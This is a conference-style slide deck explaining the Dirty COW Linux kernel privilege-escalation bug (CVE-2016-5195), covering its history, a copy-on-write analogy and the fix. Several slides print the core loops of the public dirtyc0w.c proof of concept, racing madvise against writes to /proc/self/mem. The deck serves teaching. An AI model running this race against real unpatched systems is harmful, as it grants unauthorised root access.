:title: Dirty Cow (CVE-2016-5195)
:author: BabuSubashChandar C
:skip-help: true
:data-transition-duration: 1500
:css: dirty-cow.css
:auto-console: true

Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in
the Linux Kernel.

----

.. raw:: html

    <link rel="stylesheet" href="font-awesome-4.7.0/css/font-awesome.min.css">

:data-scale: 10
:id: title

**Dirty COW Issue**
===================

BabuSubashChandar C

babusubashchandar@zilogic.com

.. note::

    Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability
    in the Linux Kernel. An ancient bug, as per the words of Linus
    Torvalds, recently fixed after several attacks found "in the
    wild".

----


:data-y: r5000
:data-scale: 1

Terminology
===========

issue == bug == exploit == vulnerability

----

:data-x: r1400
:data-y: r0
:data-rotate: 30

Who found this bug?
===================

* Phil Oester was a security researcher discovered this bug "in the wild".
* Before him, Linus Torvalds found it.

----

:data-rotate: r30

When was it found?
==================

* First reported in 1st Aug 2005 by Linus Torvalds.
* Recently by Phil Oester during an HTTP packet capture.

----

:id: affected

Are we affected?
================

**Yes!**

----

:id: fixed

Is it fixed?
============

**Yes!**

* On 18th Oct 2016, the bug was fixed.

.. line-block::

   Refer Dirty COW wiki for more details on Fixed Kernel versions.

----

**Branding**
============

.. image:: dirtycow.png
    :height: 300
    :align: center

* A logo for the bug.
* Twitter page for the same.
* An online shop.
* A github account.

----

:id: what_is_dirty_cow_issue

**Mooooooove Up**
=================

* A normal user can level up to become a privileged user.
* An attacker with an account in the system can hijack the system
  without any permission problem.

.. note::

   * Dirty COW is a nickname of the privilege-escalation vulnerability
     potentially allows any malicious code, to gain root-level access
     and completely hijack the device.

   * The programming bug gets its name from the copy-on-write
     mechanism in the Linux kernel.

   * The implementation of COW in Kernel had a flaw, the programs can
     set up a race condition to tamper with what should be a read-only
     root-owned executable mapped into memory.

   * This flaw can be exploited to take advantage on any device, which
     includes android phones, whose base is Linux Kernel. Pandemic
     across architectures.

----

:id: cow

What is COW?
============

* Resource allocation optimization strategy.
* Made multiple accesses to same resource possible.
* Without the knowledge of the accessing parties.
* Allows modification on private copy only when there is an attempt.
* And it checks for the privileges of the accessing party.

.. note::

   * Consider a furniture showroom showcases a chair.
   * Two persons are asking for the chair.
   * Unless a person orders the chair, a copy of the chair will not be
     created.
   * This is CoW and it is done automagically by OS.

----

:id: dirty_cow_explained

**Dirty COW Explained**
=======================

* Kernel hole was exploited by injecting race condition.
* Escalates the privilege of a normal user to write to a read-only file.
* Anyone can write to a root file.

.. note::

   * Now consider one of the person is repeatedly ordering and
     declining the order.
   * Now the showroom owner got crazy and gives away the chair to a
     person who didn't pay for the chair.
   * This is exactly what happens in Dirty CoW.
   * The pages allocated via CoW are marked dirty and indicated to OS
     as not needed. But the same has been written to the disk when
     asked to write by creating another copy.

----

:id: demo

**Demo**
========

.. raw:: html

    <script type="text/javascript" src="https://asciinema.org/a/5k2dcyn60gnmonffb5l72jrap.js" id="asciicast-5k2dcyn60gnmonffb5l72jrap" async></script>

----

PoC of Exploit
==============

* There are a lot of proof-of-concepts out in the internet to
  demonstrate the exploit.
* Ours is a read-only write exploit.

----

dirtyc0w.c | main function
==========================

.. code:: c

   f=open(argv[1],O_RDONLY);
   fstat(f,&st);
   name=argv[1];

   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
   printf("mmap %zx\n\n",(uintptr_t) map);

   pthread_create(&pth1,NULL,madviseThread,argv[1]);
   pthread_create(&pth2,NULL,procselfmemThread,argv[2]);

   pthread_join(pth1,NULL);
   pthread_join(pth2,NULL);

----

dirtyc0w.c | madvise thread
===========================

.. code:: c

   for(i=0;i<100000000;i++)
   {
          c+=madvise(map,100,MADV_DONTNEED);
   }

----

dirtyc0w.c | procselfmem thread
===============================

.. code:: c

   int f=open("/proc/self/mem",O_RDWR);
   int i,c=0;

   for(i=0;i<100000000;i++) {
          lseek(f,(uintptr_t) map,SEEK_SET);
          c+=write(f,str,strlen(str));
   }

----

:id: running_apart

Running apart
=============

.. table::

   ==============   =====================
   madivse thread   procselfmem thread
   ==============   =====================
   madvise()        ---
   ---              write()
   madvise()        ---
   ---              write()
   madvise()        ---
   ---              write()
   ...              ...
   ==============   =====================

----

:id: synchronised

Synchronised
============

.. table::

   ==============   =====================
   madivse thread   procselfmem thread
   ==============   =====================
   madvise()        ---
   ---              write()
   madvise()        ---
   ---              write()
   ---              write()
   madvise()        write()
   ==============   =====================

----


How it is fixed
===============

* By detecting the first COW using a flag in the Kernel code.

----

**Questions**
=============

----

:id: references

References
==========

* https://dirtycow.ninja - official website.
* http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/
* http://thehackernews.com/2016/10/linux-kernel-exploit.html
* https://www.martijnlibbrecht.nu/2/ - explanation of the PoC.

----

:id: followme

**Follow me**
=============

.. raw:: html

    <div class="followme">
    <table align="center">
    <tr><td>
    <i class="fa fa-linkedin-square"></i></td><td><p>&nbsp;&nbsp;babuenir</p></td></tr>
    <tr><td><i class="fa fa-twitter"></i><td><p>&nbsp;&nbsp;@babuenir</p></td></tr>
    <tr><td><i class="fa fa-github"></i><td><p>&nbsp;&nbsp;babuenir</p></td></tr></table></div>
